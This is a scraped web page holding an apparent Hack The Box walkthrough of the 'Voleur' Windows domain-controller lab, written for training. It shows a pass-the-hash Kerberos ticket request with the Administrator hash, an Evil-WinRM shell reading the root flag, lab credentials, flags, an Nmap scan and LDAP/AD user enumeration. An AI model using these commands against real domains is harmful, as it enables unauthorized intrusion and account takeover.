ntpdate voleur.htb \u0026\u0026 impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 2025-07-06 22:56:51.853291 (+0200) +28799.933401 +/- 0.013588 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.933401 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Administrator.ccache ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# export KRB5CCNAME=/home/hexhunter404/Downloads/Administrator.ccache ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB 2025-07-06 22:57:42.293729 (+0200) +28799.927044 +/- 0.011306 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.927044 Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd ..*Evil-WinRM* PS C:\\Users\\Administrator\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/29/2025 1:12 AM 2308 Microsoft Edge.lnk -ar--- 7/5/2025 8:38 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat root.txt 092ea0c8c50e977873d72cf015ba61d2 The final phase utilized the extracted Administrator hash to perform a pass-the-hash attack, obtaining a Kerberos ticket without knowing the plaintext password. This technique demonstrates how compromised password hashes can be leveraged for authentication in Windows environments.\nThe successful acquisition of Domain Administrator privileges provided complete control over the voleur.htb domain. This level of access allows for data exfiltration, system modification, and establishment of persistent access mechanisms.\nRoot Flag:¬†092ea0c8c50e977873d72cf015ba61d2\nWriteup completed by HexHunter404 - HTB Pro Hacker #544 Machine solved on: [Date] | Writeup published on: {{ .Date.Format ‚ÄúAugust 1, 2025‚Äù }}\n","wordCount":"5254","inLanguage":"en","image":"https://dhiaznaidiblog.github.io/images/writeups/htb/voleur/voleur-banner.png","datePublished":"2024-12-01T10:00:00+01:00","dateModified":"2024-12-01T10:00:00+01:00","author":{"@type":"Person","name":"HexHunter404"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/voleur/voleur/"},"publisher":{"@type":"Organization","name":"HexHunter404 - Cybersecurity \u0026 AI","logo":{"@type":"ImageObject","url":"https://dhiaznaidiblog.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/ accesskey=h title="üîê HexHunter404 (Alt + H)"><img src=https://dhiaznaidiblog.github.io/favicon.ico alt aria-label=logo height=35>üîê HexHunter404</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/ title="üìù Writeups"><span>üìù Writeups</span></a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/ title="üéØ HTB"><span>üéØ HTB</span></a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/thm/ title="üîç THM"><span>üîç THM</span></a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/research/ title="üß† AI Research"><span>üß† AI Research</span></a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tools/ title="üõ†Ô∏è Tools"><span>üõ†Ô∏è Tools</span></a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/about/ title="üë§ About"><span>üë§ About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/>Home</a>&nbsp;¬ª&nbsp;<a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/>Writeups</a>&nbsp;¬ª&nbsp;<a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/>üéØ Hack The Box - Pro Hacker #544</a>&nbsp;¬ª&nbsp;<a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/>üñ•Ô∏è HTB Machines - Walkthrough Collection</a></div><h1 class="post-title entry-hint-parent">[HTB] Voleur - Advanced Windows Exploitation</h1><div class=post-description>HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation</div><div class=post-meta><span title='2024-12-01 10:00:00 +0100 PM'>December 1, 2024</span>&nbsp;¬∑&nbsp;25 min&nbsp;¬∑&nbsp;5254 words&nbsp;¬∑&nbsp;HexHunter404&nbsp;|&nbsp;<a href=https://github.com/dhiaZnaidi/dhiaznaidiblog.github.io/tree/main/content/writeups/htb/machines/voleur/voleur.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><a href=https://dhiaznaidiblog.github.io/images/writeups/htb/voleur/voleur-banner.png target=_blank rel="noopener noreferrer"><img loading=eager src=https://dhiaznaidiblog.github.io/images/writeups/htb/voleur/voleur-banner.png alt="HTB Voleur Machine"></a><figcaption>Voleur - HTB Machine Walkthrough by HexHunter404</figcaption></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#machine-information><strong>Machine Information</strong></a></li><li><a href=#flags-obtained><strong>Flags Obtained</strong></a></li><li><a href=#phase-1-reconnaissance><strong>Phase 1: Reconnaissance</strong></a></li><li><a href=#phase-2-initial-access><strong>Phase 2: Initial Access</strong></a></li><li><a href=#phase-3-privilege-escalation><strong>Phase 3: Privilege Escalation</strong></a></li><li><a href=#phase-4-dpapi-exploitation><strong>Phase 4: DPAPI Exploitation</strong></a></li><li><a href=#phase-5-wslssh-access><strong>Phase 5: WSL/SSH Access</strong></a></li><li><a href=#phase-6-domain-admin><strong>Phase 6: Domain Admin</strong></a></li></ul></nav></div></details></div><div class=post-content><h2 id=machine-information><strong>Machine Information</strong><a hidden class=anchor aria-hidden=true href=#machine-information>#</a></h2><ul><li><strong>OS:</strong>¬†Windows Server 2022 (Domain Controller)</li><li><strong>Difficulty:</strong>¬†Medium</li><li><strong>Initial Credentials:</strong>¬†ryan.naylor:HollowOct31Nyt</li><li><strong>Domain:</strong>¬†voleur.htb</li></ul><h2 id=flags-obtained><strong>Flags Obtained</strong><a hidden class=anchor aria-hidden=true href=#flags-obtained>#</a></h2><ul><li><strong>User Flag:</strong>¬†9ead16ec422a36bbec3e8eb539ea2d77</li><li><strong>Root Flag:</strong>¬†092ea0c8c50e977873d72cf015ba61d2</li></ul><hr><h2 id=phase-1-reconnaissance><strong>Phase 1: Reconnaissance</strong><a hidden class=anchor aria-hidden=true href=#phase-1-reconnaissance>#</a></h2><p><strong>1.1 Nmap Scan</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.95 scan initiated Sat Jul  5 21:39:01 2025 as: /usr/lib/nmap/nmap -sV -sC -A -Pn -n -T4 -p- -vvv -oA voleur_scan --disable-arp-ping --min-rate=1000 10.129.196.199</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.196.199
</span></span><span class=line><span class=cl>Host is up, received user-set <span class=o>(</span>0.035s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2025-07-05 21:39:02 CEST <span class=k>for</span> 233s
</span></span><span class=line><span class=cl>Not shown: <span class=m>65514</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       REASON          VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        syn-ack ttl <span class=m>127</span> Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  syn-ack ttl <span class=m>127</span> Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-07-06 03:41:40Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   syn-ack ttl <span class=m>127</span> Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?     syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>2222/tcp  open  ssh           syn-ack ttl <span class=m>127</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped    syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>5985/tcp  open  http          syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        syn-ack ttl <span class=m>127</span> .NET Message Framing
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49668/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49670/tcp open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49671/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>52010/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>52016/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>52036/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running <span class=o>(</span>JUST GUESSING<span class=o>)</span>: Microsoft Windows 2022<span class=p>|</span>2012<span class=p>|</span><span class=m>2016</span> <span class=o>(</span>89%<span class=o>)</span>
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
</span></span><span class=line><span class=cl>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
</span></span><span class=line><span class=cl>Aggressive OS guesses: Microsoft Windows Server <span class=m>2022</span> <span class=o>(</span>89%<span class=o>)</span>, Microsoft Windows Server <span class=m>2012</span> R2 <span class=o>(</span>85%<span class=o>)</span>, Microsoft Windows Server <span class=m>2016</span> <span class=o>(</span>85%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>TCP/IP fingerprint:
</span></span><span class=line><span class=cl>SCAN<span class=o>(</span><span class=nv>V</span><span class=o>=</span>7.95%E<span class=o>=</span>4%D<span class=o>=</span>7/5%OT<span class=o>=</span>53%CT<span class=o>=</span>%CU<span class=o>=</span>%PV<span class=o>=</span>Y%DS<span class=o>=</span>2%DC<span class=o>=</span>T%G<span class=o>=</span>N%TM<span class=o>=</span>6869803F%P<span class=o>=</span>x86_64-pc-linux-gnu<span class=o>)</span>
</span></span><span class=line><span class=cl>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>101%GCD<span class=o>=</span>1%ISR<span class=o>=</span>108%TI<span class=o>=</span>I%II<span class=o>=</span>I%SS<span class=o>=</span>S%TS<span class=o>=</span>A<span class=o>)</span>
</span></span><span class=line><span class=cl>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>106%GCD<span class=o>=</span>1%ISR<span class=o>=</span>104%TI<span class=o>=</span>I%II<span class=o>=</span>I%SS<span class=o>=</span>S%TS<span class=o>=</span>A<span class=o>)</span>
</span></span><span class=line><span class=cl>OPS<span class=o>(</span><span class=nv>O1</span><span class=o>=</span>M552NW8ST11%O2<span class=o>=</span>M552NW8ST11%O3<span class=o>=</span>M552NW8NNT11%O4<span class=o>=</span>M552NW8ST11%O5<span class=o>=</span>M552NW8ST11%O6<span class=o>=</span>M552ST11<span class=o>)</span>
</span></span><span class=line><span class=cl>WIN<span class=o>(</span><span class=nv>W1</span><span class=o>=</span>FFFF%W2<span class=o>=</span>FFFF%W3<span class=o>=</span>FFFF%W4<span class=o>=</span>FFFF%W5<span class=o>=</span>FFFF%W6<span class=o>=</span>FFDC<span class=o>)</span>
</span></span><span class=line><span class=cl>ECN<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%TG<span class=o>=</span>80%W<span class=o>=</span>FFFF%O<span class=o>=</span>M552NW8NNS%CC<span class=o>=</span>Y%Q<span class=o>=)</span>
</span></span><span class=line><span class=cl>T1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%TG<span class=o>=</span>80%S<span class=o>=</span>O%A<span class=o>=</span>S+%F<span class=o>=</span>AS%RD<span class=o>=</span>0%Q<span class=o>=)</span>
</span></span><span class=line><span class=cl>T2<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>T3<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>T4<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>U1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>
</span></span><span class=line><span class=cl>IE<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DFI<span class=o>=</span>N%TG<span class=o>=</span>80%CD<span class=o>=</span>Z<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Uptime guess: 0.004 days <span class=o>(</span>since Sat Jul  <span class=m>5</span> 21:36:49 2025<span class=o>)</span>
</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
</span></span><span class=line><span class=cl>TCP Sequence Prediction: <span class=nv>Difficulty</span><span class=o>=</span><span class=m>262</span> <span class=o>(</span>Good luck!<span class=o>)</span>
</span></span><span class=line><span class=cl>IP ID Sequence Generation: Incremental
</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OSs: Windows, Linux<span class=p>;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-07-06T03:42:37
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 62173/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 65250/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 43717/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 39257/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 8h00m19s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE <span class=o>(</span>using port 445/tcp<span class=o>)</span>
</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
</span></span><span class=line><span class=cl><span class=m>1</span>   25.92 ms 10.10.14.1
</span></span><span class=line><span class=cl><span class=m>2</span>   26.78 ms 10.129.196.199
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/share/nmap
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sat Jul  5 21:42:55 2025 -- 1 IP address (1 host up) scanned in 234.63 seconds</span>
</span></span></code></pre></td></tr></table></div></div><p>The initial reconnaissance phase began with a comprehensive Nmap scan to identify all open ports and services.</p><p><strong>Key Services Discovered:</strong></p><ul><li><strong>53/tcp (DNS)</strong>¬†- Essential for domain name resolution in Active Directory environments</li><li><strong>88/tcp (Kerberos)</strong>¬†- Core authentication protocol for Windows domains</li><li><strong>389/tcp (LDAP)</strong>¬†- Directory services for domain queries and authentication</li><li><strong>445/tcp (SMB)</strong>¬†- File sharing and administrative access</li><li><strong>2222/tcp (SSH)</strong>¬†- Unusual service for a Windows DC, suggesting WSL or custom implementation</li><li><strong>5985/tcp (WinRM)</strong>¬†- Windows Remote Management for PowerShell remoting</li></ul><p>The discovery of SSH on port 2222 was particularly noteworthy, as this is atypical for Windows Domain Controllers and suggested the presence of Windows Subsystem for Linux (WSL) or a custom SSH implementation. This would prove crucial in later phases of the attack.</p><p><strong>1.2 Domain Enumeration</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Time synchronization</span>
</span></span><span class=line><span class=cl>ntpdate voleur.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Basic LDAP enumeration</span>
</span></span><span class=line><span class=cl>ldapsearch -x -H ldap://10.129.196.199 -D <span class=s2>&#34;ryan.naylor@voleur.htb&#34;</span> -w <span class=s1>&#39;HollowOct31Nyt&#39;</span> -b <span class=s2>&#34;dc=voleur,dc=htb&#34;</span> <span class=s2>&#34;(objectClass=*)&#34;</span> -s base
</span></span></code></pre></td></tr></table></div></div><p>Domain enumeration began with time synchronization using¬†<code>ntpdate</code>, which is critical for Kerberos authentication as it requires synchronized clocks between client and server (typically within 5 minutes). The LDAP enumeration provided initial validation of the provided credentials and confirmed the domain structure. This baseline enumeration established the foundation for more detailed reconnaissance using specialized tools.</p><p><strong>1.3 BloodHound & ldap Collection</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-GetADUsers -all <span class=s1>&#39;voleur.htb/ryan.naylor:HollowOct31Nyt&#39;</span> -dc-ip <span class=nv>$ip</span> -k -no-pass -dc-host dc.voleur.htb 
</span></span><span class=line><span class=cl>2025-07-06 06:07:16.595561 <span class=o>(</span>+0200<span class=o>)</span> +28808.566181 +/- 0.011743 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28808.566181
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Querying dc.voleur.htb <span class=k>for</span> information about domain.
</span></span><span class=line><span class=cl>Name                  Email                           PasswordLastSet      LastLogon           
</span></span><span class=line><span class=cl>--------------------  ------------------------------  -------------------  -------------------
</span></span><span class=line><span class=cl>Administrator                                         2025-01-28 21:35:13.766711  2025-07-06 05:38:12.746180 
</span></span><span class=line><span class=cl>Guest                                                 &lt;never&gt;              &lt;never&gt;             
</span></span><span class=line><span class=cl>krbtgt                                                2025-01-29 09:43:06.152684  &lt;never&gt;             
</span></span><span class=line><span class=cl>ryan.naylor                                           2025-01-29 10:26:46.368695  2025-07-06 06:04:52.387272 
</span></span><span class=line><span class=cl>marie.bryant                                          2025-01-29 10:21:07.540658  &lt;never&gt;             
</span></span><span class=line><span class=cl>lacey.miller                                          2025-01-29 10:20:10.758901  &lt;never&gt;             
</span></span><span class=line><span class=cl>svc_ldap                                              2025-01-29 10:20:54.900094  2025-01-31 10:37:45.081360 
</span></span><span class=line><span class=cl>svc_backup                                            2025-01-29 10:20:36.962381  2025-07-06 05:38:00.277418 
</span></span><span class=line><span class=cl>svc_iis                                               2025-01-29 10:20:45.883878  &lt;never&gt;             
</span></span><span class=line><span class=cl>jeremy.combs                                          2025-01-29 16:10:32.242480  2025-01-30 12:51:02.392951 
</span></span><span class=line><span class=cl>svc_winrm                                             2025-01-31 10:10:12.398769  2025-01-29 16:07:32.711487 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
